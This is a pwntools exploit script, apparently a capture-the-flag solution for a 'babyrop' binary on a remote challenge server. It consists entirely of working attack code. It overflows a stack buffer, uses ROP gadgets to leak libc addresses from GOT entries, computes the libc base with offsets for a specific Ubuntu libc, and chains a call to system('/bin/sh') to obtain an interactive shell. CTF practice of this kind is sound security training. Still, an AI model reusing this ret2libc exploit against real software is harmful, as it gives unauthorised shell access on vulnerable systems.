from pwn import *

#TARGET = "LOCAL"
#TARGET = "DEBUG"
TARGET = "REMOTE"

# Turn on debug info
# context.log_level = 'DEBUG'

# Properly create GDB instance
context.terminal = ["tmux", "new-window"]

if TARGET == "DEBUG":
    # Debug Spawn Context
    p = gdb.debug(['./babyrop'], '''b *0x400628
    c
    ''')

if TARGET == "LOCAL":
    # Local Context
    p = process('./babyrop')

if TARGET == "REMOTE":    
    # Remote Context
    p = remote('pwnremote.threatsims.com', 9001)

# 0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
def set_rbp_r12_r13_r14_r15(rbp, r12, r13, r14, r15):
    return p64(0x4006eb) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)

# 0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
def set_rsp_r13_r14_15(rsp, r13, r14, r15):
    return p64(0x4006ed) + p64(rsp) + p64(r13) + p64(r14) + p64(r15)

# 0x00000000004006f1 : pop rsi ; pop r15 ; ret
def set_rsi_r15(rsi, r15):
    return p64(0x4006f1) + p64(rsi) + p64(r15)

# 04006f3 : pop rdi ; ret
def set_rdi(rdi):
    return p64(0x4006f3) + p64(rdi) 

FGETS_GOT = 0x601020
SETVBUF_GOT = 0x601028
STDOUT_BSS = 0x601040
STDIN_BSS = 0x601050
LEAK_PRIM = 0x400675
RET_GADGET = 0x4004ce

rbp = 'BBBBBBBB'

p.recvuntil("> ")

def leak_libc_func(got_entry, byte_num):
    first_stage = 'A'*32 + rbp + set_rdi(got_entry) + p64(LEAK_PRIM)

    p.sendline(first_stage)

    leak = p.recv(byte_num) + "\00" * (8 - byte_num)
    leak = u64(leak)
    return leak

FGETS_LEAK = leak_libc_func(FGETS_GOT, 6)
SETVBUF_LEAK = leak_libc_func(SETVBUF_GOT, 6)
STDOUT_LEAK = leak_libc_func(STDOUT_BSS, 6)
STDIN_LEAK = leak_libc_func(STDIN_BSS, 6)

print("fgets@" + hex(FGETS_LEAK))
print("setvbuf@" + hex(SETVBUF_LEAK))
print("stdout@" + hex(STDOUT_LEAK))
print("stdin@" + hex(STDIN_LEAK))

if TARGET == "REMOTE":
    # Remote libc is libc6_2.31-0ubuntu9_amd64. Calculated with libc-finder from the leaks.
    # These are the remote offsets!
    FGETS_OFFSET = 0x857b0
    SETVBUF_OFFSET = 0x87e60
    SYSTEM_OFFSET = 0x55410
    BINSH_OFFSET = 0x1b75aa
    PUTS_OFFSET = 0x875a0
else:
    # Below are LOCAL offsets!
    FGETS_OFFSET = 0x6dad0
    SETVBUF_OFFSET = 0x6fe70
    SYSTEM_OFFSET = 0x45390
    BINSH_OFFSET = 0x18cd57

# Calculate the libc base.
LIBC_BASE = FGETS_LEAK - FGETS_OFFSET

# Make sure our leak is sane.
assert(LIBC_BASE == (SETVBUF_LEAK - SETVBUF_OFFSET))

print("libc@" + hex(LIBC_BASE))
print("binsh@" + hex(LIBC_BASE + BINSH_OFFSET))
print("system@" + hex(LIBC_BASE + SYSTEM_OFFSET))

# Leak /bin/sh@libc for sanity.
# second_stage = 'A'*32 + rbp + set_rdi(LIBC_BASE + BINSH_OFFSET) + p64(LIBC_BASE + PUTS_OFFSET)

# Leak libc for sanity.
#second_stage = 'A'*32 + rbp + set_rdi(LIBC_BASE) + p64(LIBC_BASE + PUTS_OFFSET)

# Fix misalignment with the extra ret gadget
second_stage = 'A'*32 + rbp + set_rdi(LIBC_BASE + BINSH_OFFSET) + p64(RET_GADGET) + p64(LIBC_BASE + SYSTEM_OFFSET) + p64(LEAK_PRIM)

p.sendline(second_stage)
p.interactive()



